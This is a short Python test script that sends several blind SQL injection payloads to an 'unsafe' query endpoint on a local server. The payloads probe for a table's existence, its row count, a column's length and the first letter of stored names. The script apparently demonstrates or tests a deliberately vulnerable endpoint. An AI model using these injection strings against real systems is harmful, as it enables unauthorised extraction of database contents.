#!/usr/bin/env/python
# _*_coding:utf-8_*_

import json
import threading

import httpserver.http_client as http_client


URL = "http://localhost:5088"


def do_sql_test():
    test_sql_unsafe()


def headers():
    return {
        "content-type": "application/json",
        "secret_key": "secret_key",
    }


def test_sql_unsafe(i=1):
    url = "%s/v1/api/sql?method=query_by_unsafe" % URL

    # 1. normal test
    url1 = "%s&id=1" % url
    http_client.http_request("get", url1, headers=headers(), callback=on_response)

    # 2. is there a table in the system named `test_user`?
    url2 = "%s&id=1 and 0<>(select count(*) from test_user)" % url
    http_client.http_request("get", url2, headers=headers(), callback=on_response)

    # 3. the total num of table named `test_user`
    url3 = "%s&id=1 and 1<(select count(*) from test_user)" % url
    http_client.http_request("get", url3, headers=headers(), callback=on_response)

    # 4. the length of column in the table named `test_user`
    url4 = "%s&id=1 and 1=(select count(*) from test_user where length(tele)>0)" % url
    http_client.http_request("get", url4, headers=headers(), callback=on_response)

    # 5. get column `name` in `test_user`
    url5 = "%s&id=1 and 1=(select count(*) from test_user where left(name,1)='a')" % url
    http_client.http_request("get", url5, headers=headers(), callback=on_response)


def on_response(result, data):
    data = json.dumps(data, sort_keys=True, indent=2)
    print("\n\non_response result:%s data:%s" % (result, data))
